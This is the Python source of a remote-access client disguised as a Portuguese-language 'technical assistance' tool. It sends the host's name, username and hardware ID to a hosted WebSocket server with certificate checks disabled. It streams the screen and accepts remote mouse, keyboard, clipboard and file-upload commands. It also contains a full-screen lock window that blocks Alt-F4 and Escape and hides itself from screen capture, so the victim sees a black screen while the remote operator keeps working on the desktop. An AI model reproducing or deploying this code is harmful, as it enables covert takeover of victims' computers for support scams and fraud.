import websocket
import json
import threading
import time
import base64
import os
import platform
import getpass
import hashlib
import ctypes
import ssl
import sys
import subprocess
from io import BytesIO

import mss
from PIL import Image
import pyautogui
import pyperclip

SERVER_URL = "wss://web-production-9d7cc.up.railway.app"
FRAME_INTERVAL = 0.033
QUALITY = 70
SCALE = 0.75

current_quality = QUALITY
current_scale = SCALE

pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0

client_id = None
is_connected = False
panel_connected = False
ws_app = None
running = True
screen_locked = False
lock_process = None


def set_console_title(title):
    if os.name == 'nt':
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        except:
            pass


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def get_app_hash():
    data = f"{platform.node()}{platform.machine()}"
    return hashlib.md5(data.encode()).hexdigest()[:10].lower()


def print_header():
    clear_screen()
    print("")
    print("  " + "=" * 50)
    print("  |                                                |")
    print("  |            ASSISTENCIA TECNICA                 |")
    print("  |                                                |")
    print("  " + "=" * 50)
    print(f"  Session: {get_app_hash()}")
    print("")


def print_status(status, id_code=None):
    print_header()
    if status == "connecting":
        set_console_title("Conectando...")
        print("  Status: Conectando ao servidor...")
    elif status == "waiting":
        set_console_title(f"Aguardando - {id_code}")
        print("  Status: AGUARDANDO CONEXAO")
        print("")
        print("  " + "=" * 50)
        print(f"  |         CODIGO: {id_code}                        |")
        print("  " + "=" * 50)
        print("")
        print("  Informe este codigo ao tecnico.")
    elif status == "connected":
        set_console_title(f"Conectado - {id_code}")
        print("  Status: SESSAO ATIVA")
        print("")
        print("  " + "*" * 50)
        print("  *           CONEXAO ESTABELECIDA               *")
        print("  " + "*" * 50)
        print(f"\n  ID: {id_code}")
    elif status == "disconnected":
        set_console_title(f"Desconectado - {id_code}")
        print("  Status: AGUARDANDO RECONEXAO")
        print(f"  Codigo: {id_code}")


def get_hwid():
    try:
        if os.name == 'nt':
            result = subprocess.run(
                ['wmic', 'csproduct', 'get', 'uuid'],
                capture_output=True, text=True, timeout=5,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            uuid = result.stdout.strip().split('\n')[-1].strip()
            result2 = subprocess.run(
                ['wmic', 'nic', 'where', 'NetEnabled=true', 'get', 'MACAddress'],
                capture_output=True, text=True, timeout=5,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            mac_lines = [l.strip() for l in result2.stdout.split('\n') if ':' in l]
            mac = mac_lines[0] if mac_lines else ''
            combined = f"{uuid}{mac}"
            return hashlib.sha256(combined.encode()).hexdigest()[:16].upper()
    except:
        pass
    return "N/A"


def get_system_info():
    return {
        "hostname": platform.node(),
        "username": getpass.getuser(),
        "os": f"{platform.system()} {platform.release()}",
        "hwid": get_hwid()
    }


# ============================================
# LOCK SCREEN - PROCESSO SEPARADO
# ============================================

LOCK_SCRIPT = '''
import sys
import ctypes
import tkinter as tk

message = sys.argv[1] if len(sys.argv) > 1 else "Aguarde..."

root = tk.Tk()
root.title("")
sw = root.winfo_screenwidth()
sh = root.winfo_screenheight()
root.geometry(f"{sw}x{sh}+0+0")
root.configure(bg='#000000')
root.overrideredirect(True)
root.attributes('-topmost', True)
root.protocol("WM_DELETE_WINDOW", lambda: None)
root.bind('<Alt-F4>', lambda e: 'break')
root.bind('<Escape>', lambda e: 'break')

root.update_idletasks()
try:
    hwnd = ctypes.windll.user32.GetParent(root.winfo_id())
    if hwnd == 0:
        hwnd = root.winfo_id()
    ctypes.windll.user32.SetWindowDisplayAffinity(hwnd, 0x11)
except:
    pass

frame = tk.Frame(root, bg='#000000')
frame.place(relx=0.5, rely=0.5, anchor='center')
tk.Label(frame, text="\\U0001F512", font=('Segoe UI Emoji', 72), bg='#000000', fg='#f59e0b').pack(pady=20)
tk.Label(frame, text=message, font=('Segoe UI', 24, 'bold'), bg='#000000', fg='#ffffff', wraplength=700).pack(pady=15)
tk.Label(frame, text="Por favor, aguarde o tecnico liberar a tela.", font=('Segoe UI', 12), bg='#000000', fg='#555555').pack(pady=10)

def keep_top():
    root.lift()
    root.attributes('-topmost', True)
    root.after(200, keep_top)

keep_top()
root.mainloop()
'''


def show_lock_screen(message):
    global screen_locked, lock_process

    if screen_locked:
        return

    screen_locked = True

    try:
        # Criar arquivo temporario com o script
        import tempfile
        script_path = os.path.join(tempfile.gettempdir(), 'lock_screen.pyw')
        with open(script_path, 'w', encoding='utf-8') as f:
            f.write(LOCK_SCRIPT)

        # Executar como processo separado (pythonw para sem console)
        pythonw = sys.executable.replace('python.exe', 'pythonw.exe')
        if not os.path.exists(pythonw):
            pythonw = sys.executable

        lock_process = subprocess.Popen(
            [pythonw, script_path, message],
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
        )
    except Exception as e:
        screen_locked = False


def hide_lock_screen():
    global screen_locked, lock_process

    screen_locked = False

    if lock_process:
        try:
            lock_process.terminate()
            lock_process.kill()
        except:
            pass
        lock_process = None


# ============================================
# CAPTURA DE TELA
# ============================================

def capture_screen():
    global panel_connected, running, current_quality, current_scale

    sct = mss.mss()

    while running:
        if not panel_connected:
            time.sleep(0.5)
            continue

        try:
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)

            img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')

            new_w = int(img.width * current_scale)
            new_h = int(img.height * current_scale)
            img = img.resize((new_w, new_h), Image.LANCZOS)

            buffer = BytesIO()
            img.save(buffer, format='JPEG', quality=current_quality, optimize=True)
            frame_data = base64.b64encode(buffer.getvalue()).decode('utf-8')

            if ws_app and is_connected:
                ws_app.send(json.dumps({
                    "type": "screen-frame",
                    "clientId": client_id,
                    "frame": frame_data,
                    "width": new_w,
                    "height": new_h
                }))

            time.sleep(FRAME_INTERVAL)

        except:
            time.sleep(0.5)


# ============================================
# HANDLERS
# ============================================

def handle_mouse_move(data):
    try:
        x = int(data['x'] / current_scale)
        y = int(data['y'] / current_scale)
        pyautogui.moveTo(x, y, duration=0)
    except:
        pass


def handle_mouse_click(data):
    try:
        x = int(data['x'] / current_scale)
        y = int(data['y'] / current_scale)
        btn = data.get('button', 'left')
        clicks = data.get('clicks', 1)
        if btn == 'right':
            pyautogui.click(x, y, button='right')
        elif btn == 'middle':
            pyautogui.click(x, y, button='middle')
        else:
            pyautogui.click(x, y, clicks=clicks)
    except:
        pass


def handle_mouse_scroll(data):
    try:
        pyautogui.scroll(data.get('delta', 0))
    except:
        pass


def handle_key_press(data):
    try:
        key = data.get('key', '')
        key_map = {
            'Enter': 'enter', 'Backspace': 'backspace', 'Tab': 'tab',
            'Escape': 'escape', 'ArrowUp': 'up', 'ArrowDown': 'down',
            'ArrowLeft': 'left', 'ArrowRight': 'right', 'Delete': 'delete',
            'Home': 'home', 'End': 'end', 'PageUp': 'pageup', 'PageDown': 'pagedown',
            'F1': 'f1', 'F2': 'f2', 'F3': 'f3', 'F4': 'f4', 'F5': 'f5',
            'F6': 'f6', 'F7': 'f7', 'F8': 'f8', 'F9': 'f9', 'F10': 'f10',
            'F11': 'f11', 'F12': 'f12', ' ': 'space'
        }
        pyautogui.press(key_map.get(key, key))
    except:
        pass


def handle_key_combination(data):
    try:
        keys = data.get('keys', [])
        key_map = {'Control': 'ctrl', 'Alt': 'alt', 'Shift': 'shift', 'Meta': 'win'}
        mapped = [key_map.get(k, k.lower()) for k in keys]
        pyautogui.hotkey(*mapped)
    except:
        pass


def handle_clipboard_set(data):
    try:
        pyperclip.copy(data.get('content', ''))
    except:
        pass


def handle_file_upload(data):
    try:
        filename = data.get('filename', 'file')
        filename = ''.join(c for c in filename if c.isalnum() or c in '._-')[:100]
        content = data.get('content', '')
        path = os.path.join(os.path.expanduser('~/Desktop'), filename)
        with open(path, 'wb') as f:
            f.write(base64.b64decode(content))
        if ws_app:
            ws_app.send(json.dumps({
                "type": "file-upload-result",
                "clientId": client_id,
                "success": True,
                "filename": filename
            }))
    except Exception as e:
        if ws_app:
            ws_app.send(json.dumps({
                "type": "file-upload-result",
                "clientId": client_id,
                "success": False,
                "filename": data.get('filename', ''),
                "error": str(e)[:100]
            }))


# ============================================
# WEBSOCKET
# ============================================

def on_message(ws, message):
    global client_id, panel_connected, current_quality, current_scale, running

    try:
        data = json.loads(message)
        msg_type = data.get('type')

        if msg_type == 'registered':
            client_id = data.get('clientId')
            print_status("waiting", client_id)
        elif msg_type == 'panel-connected':
            panel_connected = True
            print_status("connected", client_id)
        elif msg_type == 'panel-disconnected':
            panel_connected = False
            hide_lock_screen()
            print_status("disconnected", client_id)
        elif msg_type == 'mouse-move':
            handle_mouse_move(data)
        elif msg_type == 'mouse-click':
            handle_mouse_click(data)
        elif msg_type == 'mouse-scroll':
            handle_mouse_scroll(data)
        elif msg_type == 'key-press':
            handle_key_press(data)
        elif msg_type == 'key-combination':
            handle_key_combination(data)
        elif msg_type == 'clipboard-set':
            handle_clipboard_set(data)
        elif msg_type == 'file-upload':
            handle_file_upload(data)
        elif msg_type == 'set-quality':
            current_quality = data.get('quality', 70)
            current_scale = data.get('scale', 0.75)
        elif msg_type == 'lock-screen':
            show_lock_screen(data.get('message', 'Aguarde...'))
        elif msg_type == 'unlock-screen':
            hide_lock_screen()
        elif msg_type == 'disconnect-client':
            hide_lock_screen()
            print_header()
            print("  Sessao finalizada.")
            running = False
            time.sleep(2)
            os._exit(0)
    except:
        pass


def on_error(ws, error):
    pass


def on_close(ws, close_status_code, close_msg):
    global is_connected, panel_connected
    is_connected = False
    panel_connected = False
    hide_lock_screen()


def on_open(ws):
    global is_connected
    is_connected = True
    ws.send(json.dumps({"type": "register-client", **get_system_info()}))


def main():
    global ws_app, running

    print_status("connecting")

    threading.Thread(target=capture_screen, daemon=True).start()

    while running:
        try:
            ws_app = websocket.WebSocketApp(
                SERVER_URL,
                on_open=on_open,
                on_message=on_message,
                on_error=on_error,
                on_close=on_close
            )
            ws_app.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
        except KeyboardInterrupt:
            running = False
            break
        except:
            time.sleep(5)


if __name__ == "__main__":
    main()
